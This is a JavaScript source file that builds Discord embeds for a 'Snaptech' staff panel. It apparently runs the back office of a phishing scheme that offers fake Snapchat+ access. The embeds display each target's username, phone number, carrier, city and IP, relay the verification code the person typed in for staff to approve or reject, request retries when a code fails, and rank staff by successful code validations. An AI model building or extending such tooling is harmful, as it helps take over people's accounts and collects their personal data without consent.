/**
 * embedBuilder.js — Discord embed constructors  (v2.3)
 *
 * Improvements:
 *  - New request embed: attempt count badge, cleaner field layout
 *  - Code embed: big code display, attempt # visible
 *  - Retry embed: shows which attempt this is
 *  - Stats embed: progress bar for completion rate
 *  - Hourly chart: improved ASCII bars with max-value scaling
 */

import { EmbedBuilder }                                      from "discord.js";
import { getOperatorColor, STATUS_COLORS }                   from "./colors.js";
import { formatPhone, formatIP, getCarrierName, formatDate } from "./formatters.js";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function progressBar(value, max, length = 12) {
    const filled = Math.round((value / Math.max(max, 1)) * length);
    return "█".repeat(filled) + "░".repeat(length - filled);
}

function retryLabel(row) {
    // Try to infer attempt count from logs — not available here so we use a neutral label
    return row.status === "retry_code" ? "🔁 New attempt" : "";
}

// ─── New request ──────────────────────────────────────────────────────────────

export function buildNewRequestEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle("📱 New Snapchat+ Request")
        .setColor(color)
        .setDescription(
            `> 📡 **${carrier}** — ${row.country || "?"}  |  🆔 \`#${row.id}\``
        )
        .addFields(
            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
            { name: "⏰ Received",    value: "`" + formatDate(row.created_at) + "`", inline: true },
        )
        .setFooter({ text: "⏳ Awaiting a staff member  •  Snaptech" })
        .setTimestamp();
}

// ─── Code submitted ───────────────────────────────────────────────────────────

export function buildCodeSubmittedEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const code    = row.staff_code || "N/A";
    const len     = row.code_length || 6;
    const ip      = row.ip_address;

    // Format the code with spaces every 3 digits for readability
    const codeFmt = code.length > 3
        ? code.slice(0, 3) + " " + code.slice(3)
        : code;

    return new EmbedBuilder()
        .setTitle("🔓 Code Submitted by User")
        .setColor(0x10b981)
        .setDescription(
            `> 🔢 **${len}-digit** code — \`#${row.id}\`  |  📡 **${carrier}**`
        )
        .addFields(
            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "⏰ Submitted",   value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
            { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",         inline: false },
            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
            { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
        )
        .setFooter({ text: "⚡ Approve or reject the code below  •  Snaptech" })
        .setTimestamp();
}

// ─── Retry ────────────────────────────────────────────────────────────────────

export function buildRetryEmbed(row) {
    const color   = getOperatorColor(row.operator);
    const carrier = getCarrierName(row.operator);
    const ip      = row.ip_address;

    return new EmbedBuilder()
        .setTitle("🔄 New Code Pending")
        .setColor(0xf59e0b)
        .setDescription(
            `> ⚠️ The previous code was **incorrect**.\n> The user is entering a new code — check it below.`
        )
        .addFields(
            { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
            { name: "📞 Phone",     value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
            { name: "⏰ Retried",    value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
            { name: "📡 Carrier",   value: "`" + carrier + "`",                inline: true  },
            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`",   inline: true  },
            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",      inline: true  },
            { name: "🌐 IP",        value: formatIP(ip),                        inline: true  },
        )
        .setFooter({ text: "🔁 New attempt  •  Snaptech" })
        .setTimestamp();
}

// ─── Stats ────────────────────────────────────────────────────────────────────

export function buildStatsEmbed(stats, todayStats) {
    const total          = Number(stats.total) || 0;
    const completed      = Number(stats.completed) || 0;
    const completionRate = total > 0 ? Math.round((completed / total) * 100) : 0;
    const bar            = progressBar(completed, total);

    return new EmbedBuilder()
        .setTitle("📊 Global Statistics")
        .setColor(0x3b82f6)
        .setDescription(
            `**Completion rate: ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
        )
        .addFields(
            { name: "📋 Total",          value: "`" + stats.total      + "`", inline: true },
            { name: "⏳ Pending",        value: "`" + stats.pending    + "`", inline: true },
            { name: "👤 In Progress",   value: "`" + stats.processing + "`", inline: true },
            { name: "⏱️ Awaiting Code",  value: "`" + stats.waiting    + "`", inline: true },
            { name: "🔓 Code Submitted", value: "`" + stats.submitted  + "`", inline: true },
            { name: "✅ Completed",      value: "`" + stats.completed  + "`", inline: true },
            { name: "🔄 Retry",          value: "`" + stats.retry      + "`", inline: true },
            { name: "❌ Wrong Number",   value: "`" + stats.wrong      + "`", inline: true },
            { name: "🚫 Banned IPs",     value: "`" + stats.banned     + "`", inline: true },
            {
                name:  "📅 Today",
                value: `Requests: \`${todayStats.requests}\`  ·  Completed: \`${todayStats.completed}\``,
                inline: false,
            },
        )
        .setFooter({ text: "📡 Snaptech  •  Live data" })
        .setTimestamp();
}

// ─── Operator stats ───────────────────────────────────────────────────────────

export function buildOperatorStatsEmbed(operatorStats) {
    const embed = new EmbedBuilder()
        .setTitle("📡 Operator Distribution")
        .setColor(0x8b5cf6)
        .setDescription("Requests by mobile carrier");

    const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
    const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];

    operatorStats.forEach((row, i) => {
        const carrier = getCarrierName(row.operator);
        const pct     = total > 0 ? Math.round((row.count / total) * 100) : 0;
        const bar     = progressBar(row.count, total, 8);
        embed.addFields({
            name:   (medals[i] || "•") + " " + carrier,
            value:  `\`${bar}\` \`${row.count}\` (${pct}%)`,
            inline: false,
        });
    });

    embed.setFooter({ text: "📡 Snaptech Operators" }).setTimestamp();
    return embed;
}

// ─── Leaderboard ──────────────────────────────────────────────────────────────

export function buildLeaderboardEmbed(rows, limit) {
    const embed = new EmbedBuilder()
        .setTitle("🏆 Staff Leaderboard")
        .setColor(0xf59e0b)
        .setDescription("Top " + limit + " staff by code validations");

    if (rows.length === 0) {
        embed.setDescription("🏆 Top " + limit + " staff by validations\n\n*No validations recorded yet.*");
    } else {
        const maxV  = Number(rows[0].validations) || 1;
        const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
        rows.forEach((row, i) => {
            const bar = progressBar(row.validations, maxV, 10);
            embed.addFields({
                name:   (medals[i] || "•") + " " + row.staff,
                value:  `\`${bar}\` ✅ \`${row.validations}\` validations`,
                inline: false,
            });
        });
    }

    embed.setFooter({ text: "🏆 Snaptech Leaderboard" }).setTimestamp();
    return embed;
}

// ─── Hourly activity ──────────────────────────────────────────────────────────

export function buildHourlyStatsEmbed(hourlyData) {
    const embed = new EmbedBuilder()
        .setTitle("📈 Activity — Last 24h")
        .setColor(0x10b981);

    if (hourlyData.length === 0) {
        embed.setDescription("*No activity in the last 24 hours.*");
    } else {
        const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
        let chart = "```\n";
        hourlyData.forEach(row => {
            const hour  = String(row.hour).padStart(2, "0") + "h";
            const count = Number(row.count);
            const bars  = Math.round((count / Math.max(maxCount, 1)) * 16);
            const bar   = "█".repeat(bars).padEnd(16);
            chart      += `${hour} ${bar} ${count}\n`;
        });
        chart += "```";
        embed.setDescription(chart);
    }

    embed.setFooter({ text: "📈 Snaptech Activity" }).setTimestamp();
    return embed;
}

// ─── Staff activity ───────────────────────────────────────────────────────────

export function buildStaffActivityEmbed(activityData) {
    const embed = new EmbedBuilder()
        .setTitle("👥 Staff Activity")
        .setColor(0xec4899);

    if (activityData.length === 0) {
        embed.setDescription("*No activity recorded yet.*");
    } else {
        const grouped = {};
        activityData.forEach(row => {
            if (!grouped[row.staff]) grouped[row.staff] = {};
            grouped[row.staff][row.action] = row.count;
        });

        const actionEmoji = {
            claim:        "📋",
            unclaim:      "↩️",
            set_length:   "🔢",
            wrong_number: "❌",
            true_code:    "✅",
            false_code:   "🚫",
        };

        Object.entries(grouped).forEach(([staff, actions]) => {
            const lines = Object.entries(actions)
                .map(([action, count]) => `${actionEmoji[action] || "•"} ${action}: \`${count}\``)
                .join("\n");
            embed.addFields({ name: "👤 " + staff, value: lines, inline: true });
        });
    }

    embed.setFooter({ text: "👥 Snaptech Staff" }).setTimestamp();
    return embed;
}

// ─── Panel ────────────────────────────────────────────────────────────────────

export function buildPanelEmbed() {
    return new EmbedBuilder()
        .setTitle("🎛️ Staff Panel — Snaptech")
        .setDescription(
            "Requests appear here automatically via polling.\n" +
            "Use the buttons on each embed to process requests.\n\n" +
            "**🎨 Colors by carrier:**"
        )
        .addFields(
            { name: "🔴 Red",    value: "SFR · Telenet",            inline: true },
            { name: "🟠 Orange", value: "Orange · Orange Belgium",  inline: true },
            { name: "🔵 Blue",   value: "Bouygues · BASE",          inline: true },
            { name: "🟣 Purple", value: "Proximus",                  inline: true },
            { name: "🟡 Yellow", value: "Other carrier",             inline: true },
        )
        .setColor(0x000000)
        .setFooter({ text: "🎛️ Snaptech Panel  •  v2.3" })
        .setTimestamp();
}
